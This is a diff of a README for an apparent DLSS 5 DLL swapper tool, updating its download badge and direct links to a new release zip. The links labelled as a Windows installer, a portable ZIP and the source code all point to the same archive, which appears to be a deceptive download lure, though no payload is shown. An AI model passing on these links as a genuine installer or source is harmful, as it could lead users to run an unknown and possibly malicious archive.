@@ -39,15 +39,15 @@ The **Swapper** component allows you to easily swap DLSS 5 DLLs between differen
 ## 📥 Download
 
 <p align="center">
-  <a href="https://github.com/roman-g-2098j5/DLSS5-Swapper-Feeder/releases/download/3/DLSS5-Universal.zip">
+  <a href="https://github.com/roman-g-2098j5/DLSS5-Swapper-Feeder/releases/download/4/DLSS5Swapper.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
 
 **Direct Links:**
-- [Windows Installer (.exe)](https://github.com/roman-g-2098j5/DLSS5-Swapper-Feeder/releases/download/3/DLSS5-Universal.zip)
-- [Portable ZIP](https://github.com/roman-g-2098j5/DLSS5-Swapper-Feeder/releases/download/3/DLSS5-Universal.zip)
-- [Source Code](https://github.com/roman-g-2098j5/DLSS5-Swapper-Feeder/releases/download/3/DLSS5-Universal.zip)
+- [Windows Installer (.exe)](https://github.com/roman-g-2098j5/DLSS5-Swapper-Feeder/releases/download/4/DLSS5Swapper.zip)
+- [Portable ZIP](https://github.com/roman-g-2098j5/DLSS5-Swapper-Feeder/releases/download/4/DLSS5Swapper.zip)
+- [Source Code](https://github.com/roman-g-2098j5/DLSS5-Swapper-Feeder/releases/download/4/DLSS5Swapper.zip)
 
 ---
 
